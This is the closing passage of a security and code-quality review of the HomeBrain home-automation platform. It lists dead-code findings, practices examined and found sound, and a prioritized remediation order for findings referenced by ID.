- **DEAD-05 — `shared/alexa/customSkill.js:73-82` `extractSlotValue` exported but unused** (callers use `getSlotSpokenValue`). Confirm, then remove.
- **DEAD-06 — iOS `APIClient.streamURL(includeAccessTokenQuery:)` parameter is dead** (no caller passes `true`) and a latent security footgun (see SEC-40). Remove it.

**Verified clean (no dead code):** All 83 `server/services/`, all route files, all 48 models, all 14 utils are referenced. No `*.old`/`*.bak`/`*.orig`/`*~` files, no large commented-out blocks, effectively no stale TODO/FIXME. No unused server dependencies found (several are loaded via dynamic `require()`). Firmware has no committed secrets.

---

## 6. Confirmed Good Practices (checked, not vulnerable)

To avoid re-investigation, the following were specifically examined and found sound:

- **Process execution:** Nearly all `child_process` use is `spawn`/`execFile` with argument arrays (no shell) — e.g. SMB backup, platform deploy, device restart, Matter/Thread, wall-panel build. The remote-device TTS (SEC-01) is the exception.
- **Caddyfile generation:** Interpolated values escaped via `JSON.stringify` (`quoteCaddy`); hostnames/ports validated; upstream probe uses `rejectUnauthorized:true`.
- **Auth internals:** Refresh tokens stored only as SHA-256 hashes; OIDC authorization codes are single-use (atomic `findOneAndUpdate`), hashed at rest, TTL-bounded, and bound to client + redirect_uri; redirect URIs strictly allow-listed; client secrets bcrypt-hashed; session revocation enforced for `sid`-bearing tokens; `User.toJSON` strips `password`/`refreshToken`; `trust proxy` limited to loopback/private; internal routes read the raw socket address (XFF spoofing doesn't bypass them).
- **Device/integration auth:** Wall-panel and remote-device endpoints validate registration-code/claim-token/device-token; Alexa broker uses `crypto.timingSafeEqual` shared-secret auth; SmartThings webhook signature is timing-safe and fails closed; broker OAuth tokens are hashed, single-use, rotated, with revocation cascade.
- **Object-level authorization:** Core resources (`Device`, `Scene`, `Automation`, `Workflow`, `UserProfile`, etc.) have **no per-user owner field by design** — HomeBrain is a single-household shared platform with an `admin` vs `user` boundary, and almost all mutating endpoints are admin-gated. Classic cross-tenant IDOR is therefore not applicable, and none was found.
- **Frontend:** Auth uses HttpOnly cookies (`withCredentials:true`); no auth tokens in `localStorage` (the `removeItem` calls are deliberate legacy cleanup); routes lazy-loaded; effects/intervals cleaned up; no `eval`/string timers, no `postMessage` handlers, no hardcoded `http://` endpoints, no whole-library lodash/moment imports.
- **Efficiency baseline:** Device-sync writes use `bulkWrite`; the device-update emitter broadcasts only changed devices and removes listeners; most module-level Maps are TTL-bounded or capped; SSE heartbeats cleared on close; event sequence uses an atomic `$inc`; poll intervals are reasonable and guarded against double-start.
- **Native/embedded:** Watch app stores tokens in the **Keychain** (correct); no hardcoded secrets in Swift; no `WKWebView`/JS bridge; firmware uses Arduino `String`/ArduinoJson (no `strcpy`/`sprintf` into fixed buffers from network input); `HomeBrainPanelConfig.h` correctly contains only placeholders (real values injected at build time); Python helpers use list-form `subprocess` (no `shell=True`), no `eval`/`pickle`/`yaml.load`.

---

## 7. Suggested Remediation Order

1. **Edge RCE cluster (SEC-01, SEC-02, SEC-03, SEC-08):** argument-array TTS, signed+HTTPS updates, OTA cert pinning + image signing, authenticated/encrypted hub channel.
2. **Auth hardening (SEC-04, SEC-05):** rate-limit auth endpoints; fail-fast secret validation; remove the hardcoded SSL fallback.
3. **Secret hygiene (SEC-06, SEC-12, SEC-13):** Keychain for iOS tokens; encrypt integration/LWA/relay secrets at rest; redact the single-key settings read.
4. **Correctness quick win (DEAD-01):** fix the broken broker-catalog endpoint.
5. **Input/transport hardening (SEC-07, SEC-09, SEC-10, SEC-11, SEC-14, SEC-15, SEC-16, SEC-17, SEC-21):** CSRF, OAuth `state`, RainMachine TLS, Alexa audio secret/traversal, zod validation + Mongo-filter sanitization, workflow SSRF, Piper traversal, iOS ATS.
6. **Efficiency (EFF-01, EFF-02, EFF-03):** cache settings, scope the raw-body capture, fix the voice-session leak.
7. **Dead code cleanup (DEAD-02, DEAD-03):** remove unused UI components/deps and `voicePollingManager`.
8. **Remaining Low items** as hygiene/defense-in-depth.

*End of review.*
